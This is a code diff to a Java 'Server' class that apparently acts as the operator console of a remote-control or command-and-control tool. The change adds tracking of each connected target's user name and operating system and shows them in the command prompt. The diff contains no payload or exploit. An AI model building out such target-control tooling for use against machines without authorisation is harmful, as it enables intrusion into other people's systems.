@@ -18,6 +18,8 @@ public class Server {
 
     private static ServerSocket serverSocket;
     private final static Map<Integer, ClientConnection> targets = new HashMap<>();
+    private final static Map<ClientConnection, String> systemNames = new HashMap<>();
+    private final static Map<ClientConnection, String> userOS = new HashMap<>();
     private static int id = 0;
     private static ClientConnection actualTarget;
 
@@ -45,7 +47,9 @@ public class Server {
 
         String command;
         do {
-            System.out.println(ConsoleColors.BLUE + "Target: " + formatIPandPORT(actualTarget) + ConsoleColors.RESET+"\n");
+            String userOS = Server.userOS.get(actualTarget);
+            String userName = Server.systemNames.get(actualTarget);
+            System.out.println(ConsoleColors.BLUE + "Target: " + userName + "@" + formatIPandPORT(actualTarget) + ConsoleColors.RESET+ " - " + userOS +"\n");
             command = sc.nextLine();
             if(!isNullOrEmpty(command)) {
                 switch(command) {
@@ -84,6 +88,14 @@ public class Server {
 
         // might or not be null
         actualTarget = targets.get(0);
+    }
+
+    public static void addUserOS(ClientConnection c, String os) {
+        userOS.put(c, os);
+    }
+
+    public static void addUserSystemName(ClientConnection c, String user     ) {
+        systemNames.put(c, user);
     }
 
     private static void printTargets() {
